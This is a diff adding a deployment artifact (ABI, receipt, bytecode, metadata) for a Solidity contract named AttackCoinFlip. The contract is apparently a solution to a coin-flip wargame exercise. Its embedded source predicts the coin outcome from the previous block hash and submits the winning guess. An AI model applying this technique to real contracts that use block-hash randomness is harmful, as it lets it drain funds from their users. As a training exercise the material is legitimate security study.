@@ -1,0 +1,97 @@
+{
+  "address": "0xF1b9aAcef454c0eEBC895Dc14BaddB26309EA213",
+  "abi": [
+    {
+      "inputs": [
+        {
+          "internalType": "contract ICoinFlip",
+          "name": "_coinFlip",
+          "type": "address"
+        }
+      ],
+      "stateMutability": "nonpayable",
+      "type": "constructor"
+    },
+    {
+      "inputs": [],
+      "name": "flip",
+      "outputs": [],
+      "stateMutability": "nonpayable",
+      "type": "function"
+    }
+  ],
+  "transactionHash": "0xd365fe6db587d4cb43a44c341ee7c080f4fb87725bb83f9b2cd66ecb0b07d411",
+  "receipt": {
+    "to": null,
+    "from": "0x8cF85e19217a30C536E1426cEE246b1213Ccf2f8",
+    "contractAddress": "0xF1b9aAcef454c0eEBC895Dc14BaddB26309EA213",
+    "transactionIndex": 9,
+    "gasUsed": "187380",
+    "logsBloom": "0x00000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000",
+    "blockHash": "0x6a2719df770555df173b9a946b49b2006698cc8199c63a6113b711c3ee0b668b",
+    "transactionHash": "0xd365fe6db587d4cb43a44c341ee7c080f4fb87725bb83f9b2cd66ecb0b07d411",
+    "logs": [],
+    "blockNumber": 4206857,
+    "cumulativeGasUsed": "7334858",
+    "status": 1,
+    "byzantium": true
+  },
+  "args": [
+    "0x23bE44305785E35D1c07a22998f862c294e27EaF"
+  ],
+  "numDeployments": 1,
+  "solcInputHash": "5ea42a1368378a33ff71be9b25f46159",
+  "metadata": "{\"compiler\":{\"version\":\"0.8.17+commit.8df45f5f\"},\"language\":\"Solidity\",\"output\":{\"abi\":[{\"inputs\":[{\"internalType\":\"contract ICoinFlip\",\"name\":\"_coinFlip\",\"type\":\"address\"}],\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"},{\"inputs\":[],\"name\":\"flip\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"}],\"devdoc\":{\"kind\":\"dev\",\"methods\":{},\"version\":1},\"userdoc\":{\"kind\":\"user\",\"methods\":{},\"version\":1}},\"settings\":{\"compilationTarget\":{\"contracts/CoinFlip/AttackCoinFlip.sol\":\"AttackCoinFlip\"},\"evmVersion\":\"london\",\"libraries\":{},\"metadata\":{\"bytecodeHash\":\"ipfs\",\"useLiteralContent\":true},\"optimizer\":{\"enabled\":true,\"runs\":200},\"remappings\":[]},\"sources\":{\"contracts/CoinFlip/AttackCoinFlip.sol\":{\"content\":\"// SPDX-License-Identifier: MIT\\npragma solidity ^0.8.0;\\n\\nimport \\\"./ICoinFlip.sol\\\";\\n\\ncontract AttackCoinFlip {\\n\\n    ICoinFlip coinFlip;\\n    uint256 lastHash;\\n    uint256 FACTOR =\\n        57896044618658097711785492504343953926634992332820282019728792003956564819968;\\n\\n    constructor(ICoinFlip _coinFlip) {\\n        coinFlip = _coinFlip;\\n    }\\n\\n    function flip() public {\\n        uint256 blockValue = uint256(blockhash(block.number - 1));\\n        lastHash = blockValue;\\n        uint256 cFlip = blockValue / FACTOR;\\n        bool side = cFlip == 1 ? true : false;\\n        coinFlip.flip(side);\\n    }\\n}\\n\",\"keccak256\":\"0xe634239cc910332cf3d01ef80e55cdbffccacd1a7341e45495ca5d7f9d7592c0\",\"license\":\"MIT\"},\"contracts/CoinFlip/ICoinFlip.sol\":{\"content\":\"// SPDX-License-Identifier: SEE LICENSE IN LICENSE\\npragma solidity ^0.8.0;\\n\\ninterface ICoinFlip {\\n    function flip(bool _guess) external returns (bool);\\n}\",\"keccak256\":\"0x6259c248cc59f093514c266d33e3b3e0bd87856e767908188595db67e4f7839e\",\"license\":\"SEE LICENSE IN LICENSE\"}},\"version\":1}",
+  "bytecode": "0x6080604052600160ff1b60025534801561001857600080fd5b506040516102303803806102308339810160408190526100379161005c565b600080546001600160a01b0319166001600160a01b039290921691909117905561008c565b60006020828403121561006e57600080fd5b81516001600160a01b038116811461008557600080fd5b9392505050565b6101958061009b6000396000f3fe608060405234801561001057600080fd5b506004361061002b5760003560e01c8063cde4efa914610030575b600080fd5b61003861003a565b005b60006100476001436100ed565b4060018190556002549091506000906100609083610114565b9050600081600114610073576000610076565b60015b600054604051631d263f6760e01b815282151560048201529192506001600160a01b031690631d263f67906024016020604051808303816000875af11580156100c3573d6000803e3d6000fd5b505050506040513d601f19601f820116820180604052508101906100e79190610136565b50505050565b8181038181111561010e57634e487b7160e01b600052601160045260246000fd5b92915050565b60008261013157634e487b7160e01b600052601260045260246000fd5b500490565b60006020828403121561014857600080fd5b8151801515811461015857600080fd5b939250505056fea2646970667358221220c8f3337c4f9ccf8d5c256917bce38498bfec61ac28c6446c62f6ef0fb84e61e764736f6c63430008110033",
+  "deployedBytecode": "0x608060405234801561001057600080fd5b506004361061002b5760003560e01c8063cde4efa914610030575b600080fd5b61003861003a565b005b60006100476001436100ed565b4060018190556002549091506000906100609083610114565b9050600081600114610073576000610076565b60015b600054604051631d263f6760e01b815282151560048201529192506001600160a01b031690631d263f67906024016020604051808303816000875af11580156100c3573d6000803e3d6000fd5b505050506040513d601f19601f820116820180604052508101906100e79190610136565b50505050565b8181038181111561010e57634e487b7160e01b600052601160045260246000fd5b92915050565b60008261013157634e487b7160e01b600052601260045260246000fd5b500490565b60006020828403121561014857600080fd5b8151801515811461015857600080fd5b939250505056fea2646970667358221220c8f3337c4f9ccf8d5c256917bce38498bfec61ac28c6446c62f6ef0fb84e61e764736f6c63430008110033",
+  "devdoc": {
+    "kind": "dev",
+    "methods": {},
+    "version": 1
+  },
+  "userdoc": {
+    "kind": "user",
+    "methods": {},
+    "version": 1
+  },
+  "storageLayout": {
+    "storage": [
+      {
+        "astId": 5,
+        "contract": "contracts/CoinFlip/AttackCoinFlip.sol:AttackCoinFlip",
+        "label": "coinFlip",
+        "offset": 0,
+        "slot": "0",
+        "type": "t_contract(ICoinFlip)73"
+      },
+      {
+        "astId": 7,
+        "contract": "contracts/CoinFlip/AttackCoinFlip.sol:AttackCoinFlip",
+        "label": "lastHash",
+        "offset": 0,
+        "slot": "1",
+        "type": "t_uint256"
+      },
+      {
+        "astId": 10,
+        "contract": "contracts/CoinFlip/AttackCoinFlip.sol:AttackCoinFlip",
+        "label": "FACTOR",
+        "offset": 0,
+        "slot": "2",
+        "type": "t_uint256"
+      }
+    ],
+    "types": {
+      "t_contract(ICoinFlip)73": {
+        "encoding": "inplace",
+        "label": "contract ICoinFlip",
+        "numberOfBytes": "20"
+      },
+      "t_uint256": {
+        "encoding": "inplace",
+        "label": "uint256",
+        "numberOfBytes": "32"
+      }
+    }
+  }
+}
